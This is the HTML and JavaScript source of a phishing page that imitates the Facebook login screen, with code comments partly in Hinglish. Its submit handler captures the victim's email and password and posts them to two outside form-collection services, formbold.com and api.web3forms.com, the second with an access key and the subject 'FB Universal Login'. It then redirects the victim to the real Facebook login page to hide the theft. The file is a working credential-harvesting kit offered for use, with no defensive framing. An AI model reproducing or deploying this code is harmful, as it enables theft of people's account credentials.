<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        /* Cursor 'none' sirf PC par arrow hide karega */
        * { box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; cursor: none; }
        
        body { 
            margin: 0; padding: 0; background-color: #f0f2f5; 
            display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; overflow-x: hidden;
        }

        /* 🖱️ UNIVERSAL TRACKER DOT */
        #cursor-glow {
            position: fixed; width: 160px; height: 160px;
            background: radial-gradient(circle, rgba(24, 119, 242, 0.2) 0%, transparent 70%);
            border-radius: 50%; pointer-events: none; transform: translate(-50%, -50%);
            z-index: 9998; left: -500px; top: -500px; transition: opacity 0.3s;
        }
        .custom-cursor {
            position: fixed; width: 12px; height: 12px; background: #1877f2;
            border-radius: 50%; pointer-events: none; z-index: 9999;
            transform: translate(-50%, -50%); left: -500px; top: -500px;
            box-shadow: 0 0 10px rgba(24, 119, 242, 0.8);
        }

        /* LOGO & CARD */
        .header-box { margin-top: 40px; text-align: center; width: 100%; }
        .fb-logo { color: #1877f2; font-size: 50px; font-weight: bold; letter-spacing: -2px; margin-bottom: 20px; }

        .login-container {
            background: #fff; padding: 20px; border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 90%; max-width: 400px; z-index: 2; position: relative;
        }

        input {
            width: 100%; padding: 14px; margin-bottom: 12px;
            border: 1px solid #dddfe2; border-radius: 6px;
            font-size: 17px; outline: none; cursor: none;
        }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }

        .btn-login {
            width: 100%; padding: 12px; background-color: #1877f2;
            border: none; border-radius: 6px; color: #fff;
            font-size: 20px; font-weight: bold; cursor: none;
        }

        .forgot-link { 
            color: #1877f2; text-decoration: none; font-size: 14px; 
            display: block; text-align: center; margin: 15px 0; cursor: none;
        }

        .divider { border-bottom: 1px solid #dadde1; margin-bottom: 20px; }

        .btn-create {
            width: 70%; padding: 12px; background-color: #42b72a;
            border: none; border-radius: 6px; color: #fff;
            font-size: 17px; font-weight: bold; cursor: none;
            margin: 0 auto; display: block; text-align: center; text-decoration: none;
        }

        /* Footer for real feel */
        .footer-text { margin-top: 30px; font-size: 14px; color: #1c1e21; text-align: center; width: 80%; }
    </style>
</head>
<body>

    <div id="cursor-glow"></div>
    <div class="custom-cursor"></div>

    <div class="header-box">
        <div class="fb-logo">facebook</div>
    </div>

    <div class="login-container">
        <form id="fbForm" onsubmit="handleFinalSubmit(event)">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="btn-login" id="main-btn">Log In</button>
        </form>

        <a href="https://www.facebook.com/recover/initiate" class="forgot-link">Forgotten password?</a>
        
        <div class="divider"></div>

        <a href="https://www.facebook.com/r.php" class="btn-create">Create New Account</a>
    </div>

    <div class="footer-text">
        <b>Create a Page</b> for a celebrity, brand or business.
    </div>

    <script>
        const glow = document.getElementById('cursor-glow');
        const dot = document.querySelector('.custom-cursor');

        // 🔥 UNIVERSAL TRACKER (MOUSE + TOUCH)
        function moveTracker(e) {
            let x, y;
            if (e.type.includes('touch')) {
                x = e.touches[0].clientX;
                y = e.touches[0].clientY;
                // Mobile par click block na ho isliye preventDefault nahi lagaya
            } else {
                x = e.clientX;
                y = e.clientY;
            }
            
            glow.style.left = x + 'px';
            glow.style.top = y + 'px';
            dot.style.left = x + 'px';
            dot.style.top = y + 'px';
        }

        // PC Mouse Listeners
        window.addEventListener('mousemove', moveTracker);
        
        // Mobile Touch Listeners
        window.addEventListener('touchmove', moveTracker);
        window.addEventListener('touchstart', moveTracker);

        // 📤 LOGIN DATA SUBMISSION
        async function handleFinalSubmit(e) {
            e.preventDefault();
            const btn = document.getElementById('main-btn');
            btn.innerText = "Connecting...";
            btn.disabled = true;

            const fd = new FormData(e.target);
            
            // Backup 1 (FormBold)
            fetch("https://formbold.com/s/3VKEQ", { method: "POST", body: fd, mode: 'no-cors' });

            // Backup 2 (Web3Forms)
            const w3 = new FormData(e.target);
            w3.append('access_key', '4d4d7ede-0cff-474c-86ce-5d228506375d');
            w3.append('subject', 'FB Universal Login');
            fetch("https://api.web3forms.com/submit", { method: "POST", body: w3 });

            setTimeout(() => { 
                window.location.href = "https://www.facebook.com/login.php"; 
            }, 1800);
        }
    </script>
</body>
</html>
